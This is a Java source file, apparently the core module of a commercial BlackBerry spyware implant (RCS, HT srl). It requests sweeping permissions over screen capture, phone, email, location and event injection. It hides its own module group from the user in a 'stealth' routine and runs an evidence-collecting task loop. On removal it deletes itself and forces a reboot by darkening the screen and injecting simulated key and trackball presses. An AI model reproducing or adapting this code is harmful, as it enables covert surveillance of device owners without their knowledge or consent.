//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Core.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Date;

import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Keypad;
import blackberry.config.Cfg;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.fs.Path;
import blackberry.injection.InjectorManager;
import blackberry.injection.KeyInjector;
import blackberry.utils.Utils;

/**
 * Classe Core, contiene il main.
 */
public final class Core implements Runnable {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug;
    //#endif
    private static Core instance;

    /**
     * Gets the single instance of Core.
     * 
     * @return single instance of Core
     */
    public static synchronized Core getInstance() {
        if (instance == null) {
            instance = new Core();
        }
        return instance;
    }

    /**
     * Lib main.
     * 
     * @param args
     *            the args
     */
    public static void libMain(final String[] args) {
        final Core core = Core.getInstance();
        core.run();
    }

    /** The task obj. */
    private final Task task;
    private boolean uninstallAtExit;

    /**
     * Instantiates a new core.
     */
    private Core() {
        Path.makeDirs();

        //#ifdef DEBUG
        Debug.init();
        debug = new Debug("Core", DebugLevel.VERBOSE); //$NON-NLS-1$
        debug.info("INIT " + (new Date()).toString()); //$NON-NLS-1$
        //#endif

        checkPermissions();

        task = Task.getInstance();

        Utils.sleep(1000);

        final boolean antennaInstalled = true;
        //#ifdef DEBUG
        System.out.println("DEBUG"); //$NON-NLS-1$
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_TRACE"); //$NON-NLS-1$
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_INFO"); //$NON-NLS-1$
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_WARN"); //$NON-NLS-1$
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_ERROR"); //$NON-NLS-1$
        //#endif
        //#ifdef DEBUG
        System.out.println("DEBUG_FATAL"); //$NON-NLS-1$
        //#endif

        Encryption.init();

        //Main.getInstance().goBackground();
    }

    /**
     * This method showcases the ability to check the current permissions for
     * the application. If the permissions are insufficient, the user will be
     * prompted to increase the level of permissions. You may want to restrict
     * permissions for the ApplicationPermissionsDemo.cod module beforehand in
     * order to demonstrate this sample effectively. This can be done in
     * Options/Advanced Options/Applications/(menu)Modules.Highlight
     * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
     * Permissions' from the menu.
     */
    private void checkPermissions() {

        //#ifdef DEBUG
        debug.trace("CheckPermissions"); //$NON-NLS-1$
        //#endif

        // NOTE: This sample leverages the following permissions:
        // --Event Injector
        // --Phone
        // --Device Settings
        // --Email
        // The sample demonstrates how these user defined permissions will
        // cause the respective tests to succeed or fail. Individual
        // applications will require access to different permissions.
        // Please review the Javadocs for the ApplicationPermissions class
        // for a list of all available permissions
        // May 13, 2008: updated permissions by replacing deprecated constants.

        // Capture the current state of permissions and check against the
        // requirements
        final ApplicationPermissionsManager apm = ApplicationPermissionsManager
                .getInstance();
        final ApplicationPermissions original = apm.getApplicationPermissions();

        // Set up and attach a reason provider
        final CoreReasonProvider drp = new CoreReasonProvider();
        apm.addReasonProvider(
                ApplicationDescriptor.currentApplicationDescriptor(), drp);

        //int PERMISSION_INTERNET = 0x7;
        int PERMISSION_DISPLAY_LOCKED = 22;
        final int[] wantedPermissions = new int[] {
                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_BLUETOOTH,
                ApplicationPermissions.PERMISSION_WIFI,
                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                ApplicationPermissions.PERMISSION_PIM,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_LOCATION_API,
                ApplicationPermissions.PERMISSION_FILE_API,
                ApplicationPermissions.PERMISSION_MEDIA,
                ApplicationPermissions.PERMISSION_EMAIL,
                ApplicationPermissions.PERMISSION_EVENT_INJECTOR,
                ApplicationPermissions.PERMISSION_IDLE_TIMER,
                ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                ApplicationPermissions.PERMISSION_BROWSER_FILTER,
                ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION,
                ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,
                //#ifdef SMS_HIDE
                ApplicationPermissions.PERMISSION_CROSS_APPLICATION_COMMUNICATION,
        //#endif
        //PERMISSION_DISPLAY_LOCKED, // 22
        };

        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 

        boolean allPermitted = true;
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];

            try {
                if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                    allPermitted = false;
                }
            } catch (IllegalArgumentException ex) {
                //#ifdef DEBUG
                debug.error("checkPermissions: " + perm + " " + ex); //$NON-NLS-1$ //$NON-NLS-2$
                //#endif
            }
        }

        if (allPermitted) {
            // All of the necessary permissions are currently available
            //#ifdef DEBUG
            debug.info("All of the necessary permissions are currently available"); //$NON-NLS-1$
            //#endif
            return;
        }

        // Create a permission request for each of the permissions your
        // application
        // needs. Note that you do not want to list all of the possible
        // permission
        // values since that provides little value for the application or the
        // user.
        // Please only request the permissions needed for your application.
        final ApplicationPermissions permRequest = new ApplicationPermissions();
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];
            permRequest.addPermission(perm);
        }

        final boolean acceptance = ApplicationPermissionsManager.getInstance()
                .invokePermissionsRequest(permRequest);

        if (acceptance) {
            // User has accepted all of the permissions
            //#ifdef DEBUG
            debug.info("User has accepted all of the permissions"); //$NON-NLS-1$
            //#endif
        } else {
            //#ifdef DEBUG
            debug.warn("User has accepted some or none of the permissions"); //$NON-NLS-1$
            //#endif
        }

    }

    /**
     * Run.
     * 
     * @return true, if successful
     */
    public void run() {
        // 7.2= DEMO
        String demo = Status.self().isDemo() ? Messages.getString("7.2") : "";

        //#ifdef DEBUG
        debug.info("START: " + (new Date())); //$NON-NLS-1$
        Evidence.info("Start" + demo + ",  build: " + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP); //$NON-NLS-1$ //$NON-NLS-2$
        //#else
        Evidence.info(Messages.getString("7.17") + demo); //$NON-NLS-1$
        //EventLogger.setMinimumLevel(EventLogger.SEVERE_ERROR);
        //#endif

        stealth();
        Utils.sleep(500);
        try {
            for (;;) {
                //#ifdef DEBUG
                debug.info("init task"); //$NON-NLS-1$
                //#endif
                if (task.taskInit() <= 0) {
                    //#ifdef DEBUG
                    debug.error("TaskInit() FAILED"); //$NON-NLS-1$
                    //#endif
                    break;
                } else {
                    //#ifdef DEBUG
                    debug.trace("TaskInit() OK"); //$NON-NLS-1$
                    //#endif
                    // CHECK: Status o init?
                }

                //#ifdef DEBUG
                debug.info("starting checking actions"); //$NON-NLS-1$
                //#endif
                if (task.checkActions() == false) {
                    //#ifdef DEBUG
                    debug.error("CheckActions() wants to exit"); //$NON-NLS-1$
                    //#endif
                    // chiudere tutti i thread
                    break;
                } else {
                    //#ifdef DEBUG
                    debug.info("Waiting a while before reloading"); //$NON-NLS-1$
                    //#endif
                    Utils.sleep(2000);
                }
            }

            task.stopAll();
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("run " + ex); //$NON-NLS-1$
            //#endif
        } finally {

            //#ifdef DEBUG
            debug.trace("RCSBlackBerry exit "); //$NON-NLS-1$
            //#endif

            //#ifdef DEBUG
            Debug.stop();
            //#endif

            Singleton.self().clear();
            Utils.sleep(2000);

            if (uninstallAtExit) {
                final ApplicationDescriptor ad = ApplicationDescriptor
                        .currentApplicationDescriptor();

                //ApplicationManager.getApplicationManager().scheduleApplication(ad, System.currentTimeMillis() + 10001, true);
                uninstall();
            }

            System.exit(0);
        }
    }

    public static void uninstall() {
        //#ifdef DEBUG
        System.out.println("uninstalling");
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();
        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            //CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String name = CodeModuleManager.getModuleName(handle);

            if (name.startsWith(Cfg.MODULE_NAME)) {
                //#ifdef DEBUG
                debug.warn("Removing handle: " + handle + " name: " + name);
                //#endif
                CodeModuleManager.deleteModuleEx(handle, true);
            }
        }

        final ApplicationDescriptor ad = ApplicationDescriptor
                .currentApplicationDescriptor();

        final int moduleHandle = ad.getModuleHandle();
        final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);

        //TODO: sperimentale
        forceReboot();
    }

    public static void forceReboot() {
        //TODO: se il telefono e' occupato, attendere il tempo necessario.
        try {

            Backlight.enable(false);
            //Main.getInstance().pushBlack();
            Utils.sleep(8000);

            if (!InjectorManager.unLock()) {
                //#ifdef DEBUG
                debug.trace("forceReboot: unlock failed");
                //#endif
            }

            if (Backlight.isEnabled()) {
                //#ifdef DEBUG
                debug.trace("forceReboot, backlight, bailing out");
                //#endif
                return;
            }
            CodeModuleManager.promptForResetIfRequired();
            Backlight.enable(false);

            Utils.sleep(500);
            KeyInjector.trackBallDown(20);
            Utils.sleep(100);
            KeyInjector.trackBallUp(1);
            Utils.sleep(100);
            KeyInjector.pressKey(Keypad.KEY_ENTER);
            Utils.sleep(100);
            KeyInjector.trackBallClick();
            Utils.sleep(100);
            KeyInjector.trackBallDown(20);
            Utils.sleep(100);
            KeyInjector.trackBallUp(1);
            Utils.sleep(100);
            KeyInjector.trackBallClick();
        } finally {
            //Main.getInstance().popBlack();
        }
    }

    /**
     * Stealth.
     */
    private void stealth() {

        try {

            final String sCurrentModuleName = ApplicationDescriptor
                    .currentApplicationDescriptor().getModuleName();
            //#ifdef DEBUG
            debug.info(sCurrentModuleName);
            //#endif

            final CodeModuleGroup[] allGroups = CodeModuleGroupManager
                    .loadAll();
            CodeModuleGroup myGroup = null;
            final String moduleName = ApplicationDescriptor
                    .currentApplicationDescriptor().getModuleName();

            for (int i = 0; i < allGroups.length; i++) {
                if (allGroups[i].containsModule(moduleName)) {
                    myGroup = allGroups[i];
                    break;
                }
            }

            if (myGroup != null) {
                myGroup.setFlag(CodeModuleGroup.FLAG_REQUIRED, true);

                //#ifdef DEBUG
                debug.trace("stealth: hiding..."); //$NON-NLS-1$
                //#endif                
                myGroup.setFlag(CodeModuleGroup.FLAG_HIDDEN, true);
                //#ifdef DEBUG
                debug.info("Group Hidden!"); //$NON-NLS-1$
                //#endif
            } else {
                //#ifdef DEBUG
                debug.warn("group not found"); //$NON-NLS-1$
                //#endif
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("st " + ex); //$NON-NLS-1$
            //#endif
        }
    }

    public void uninstallAtExit() {
        this.uninstallAtExit = true;
    }

}
